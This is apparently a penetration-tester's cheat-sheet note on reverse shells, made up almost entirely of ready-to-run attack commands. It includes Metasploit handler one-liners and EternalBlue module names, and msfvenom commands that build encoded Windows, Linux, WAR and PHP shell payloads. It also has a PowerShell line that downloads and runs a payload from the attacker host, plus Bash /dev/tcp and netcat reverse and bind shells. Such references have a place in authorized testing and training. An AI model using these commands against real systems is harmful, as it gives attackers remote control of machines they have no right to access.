---
title: Reverse Shells
type: note
tab: Payloads
tools: [bash, msfvenom, metasploit]
inputs: []
outputs: [Shell]
tags: [Payloads, Linux]
---

# Reverse Shells

## Metasploit Handler

#Payloads
Start a quiet Metasploit multi/handler for a Linux x64 meterpreter reverse TCP payload.

```sh
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; exploit -j"
```

## Metasploit Useful Modules

#Payloads #Exploitation
Common Metasploit modules worth remembering for quick checks, handlers, and local exploit suggestions.

```text
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/ssh/ssh_enumusers
use exploit/multi/handler
use post/multi/recon/local_exploit_suggester
use auxiliary/scanner/portscan/tcp
```

## MSFvenom Payloads

#Payloads
Generate common reverse-shell payloads for Windows, Linux, JSP/WAR, and PHP.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meter.exe
```

## Windows Meterpreter Payloads

#Shell #Windows #Payloads
Generate a Windows Meterpreter payload, catch it, trigger it from a Windows shell, and optionally execute a second stage.

```sh
# Attacker: generate the first Meterpreter executable.
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<LHOST> LPORT=<LPORT> -f exe -o newshell.exe

# Attacker: start the matching handler.
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
run

# Target PowerShell: download and execute the payload.
powershell "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/newshell.exe', 'newshell.exe')"
Start-Process 'newshell.exe'

# Attacker/Meterpreter: optional second-stage payload.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > admin.exe
upload /home/kali/Desktop/admin.exe admin.exe
execute -f admin.exe
```

## Bash Reverse Shell

#Linux #Payloads
Basic Bash TCP reverse shell one-liner.

```sh
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Netcat Shells

### Reverse Shell

#Linux #Payloads
Catch a reverse shell from a target that has Netcat with `-e` support.

1. Start the listener on the attacker box.

```sh
nc -lvnp <LPORT>
```

2. Trigger the reverse shell on the target.

```sh
nc <LHOST> <LPORT> -e /bin/bash
```

### Blind Shell

#Linux #Payloads
Expose `/bin/bash` over Netcat on the target, then connect to it from the attacker box.

1. Start the bind shell on the target.

```sh
nc -lvnp <LPORT> -e /bin/bash
```

2. Connect from the attacker box.

```sh
nc <TARGET_IP> <LPORT>
```

### Bash TCP Fallback

#Shell #Linux #Payloads
Use Bash `/dev/tcp` when Netcat does not support `-e`.

1. Start the listener on the attacker box.

```sh
nc -lvnp <LPORT>
```

2. Trigger the Bash reverse shell on the target.

```sh
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Notes

- Keep a listener or handler ready before triggering the payload.
- Replace placeholder host and port values before use.
